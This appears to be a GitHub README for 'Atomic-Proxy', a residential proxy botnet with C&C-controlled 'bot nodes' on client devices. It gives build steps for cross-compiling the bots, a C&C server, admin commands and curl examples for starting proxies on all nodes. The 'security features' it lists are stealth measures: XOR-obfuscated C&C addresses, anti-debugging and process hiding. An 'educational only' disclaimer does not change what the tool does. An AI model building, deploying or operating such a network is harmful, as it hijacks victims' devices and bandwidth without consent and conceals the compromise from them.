<div align="center">
  
# Atomic-Proxy

**Atomic-Proxy is a residential proxy network system designed for educational and research purposes in understanding proxy network architectures and distributed systems.**

  <img width="714" height="420" alt="image" src="https://github.com/user-attachments/assets/d4e83fa7-a9f9-4a22-b424-bdfc2eebd89c" />
</div>


## Overview

This project demonstrates a distributed residential proxy network architecture where nodes act as SOCKS5 proxy servers. The system includes:

- **Bot Nodes**: SOCKS5 proxy servers running on client devices
- **C&C Server**: Centralized management and control server
- **API**: RESTful API for proxy pool access and management
- **Admin Panel**: Terminal-based interface for network administration

## Build Instructions

### Requirements

- Ubuntu 20.04 or later
- GCC cross-compilers for target architectures
- Go 1.20+
- SQLite3
- pthread library

### Compilation

```bash
# Compile bot nodes for all architectures
chmod +x build.sh
./build.sh

# Compile C&C server
cd cnc
go build
```

### Configuration

1. Configure C&C domain/IP in `bot/table.c` using the XOR tool
2. Set server settings in `assets/server.toml`
3. Initialize database: `sqlite3 assets/data.sql`

## Architecture

### Bot Node (C)
- SOCKS5 proxy server implementation
- Multi-threaded connection handling
- Bandwidth tracking and statistics
- Secure communication with C&C

### C&C Server (Go)
- Proxy pool management
- Real-time node status monitoring
- RESTful API for proxy access
- User authentication and authorization
- Geographic distribution tracking

### API Endpoints

- `GET /proxies` - List all available proxies
- `POST /proxy/start` - Start proxy on all nodes
- `POST /proxy/stop` - Stop all proxies
- `GET /proxy/stats` - Get network statistics
- `GET /proxy/list` - Export proxy list in various formats

### Admin Commands

- `proxy start [port=1080] [auth=false]` - Start proxies
- `proxy stop` - Stop all proxies
- `proxy list` - List active proxies
- `proxy stats` - View statistics
- `proxy export` - Export proxy list
- `bots` - View connected nodes

## API Usage Examples

### Start Proxy Network
```bash
curl "http://server:81/proxy/start?user=admin&password=pass&port=1080&auth=false"
```

### Get Proxy List
```bash
curl "http://server:81/proxies?user=admin&password=pass"
```

### Export Proxy List
```bash
curl "http://server:81/proxy/list?user=admin&password=pass&format=ip:port"
```

## Security Features

- XOR obfuscation for C&C communication
- Anti-debugging mechanisms
- Process hiding and self-protection
- Secure authentication for admin panel
- API key-based access control

## Disclaimer

**EDUCATIONAL PURPOSE ONLY**

This software is provided strictly for educational, research, and security testing purposes. The authors and contributors:

- Do NOT condone or encourage any illegal activity
- Are NOT responsible for any misuse or damage caused by this software
- Assume NO liability for actions taken by users of this software

**WARNING**: Running proxy networks without proper authorization may be illegal in many jurisdictions. Use of residential IPs without consent is prohibited. This code is for understanding proxy network architecture only.

**Legal Notice**: Always obtain proper authorization before deploying any proxy infrastructure. Respect privacy laws, terms of service, and computer fraud statutes in your jurisdiction.

#

<div align="center">

[**@Atomic Team**](https://github.com/AtomTM)
</div>
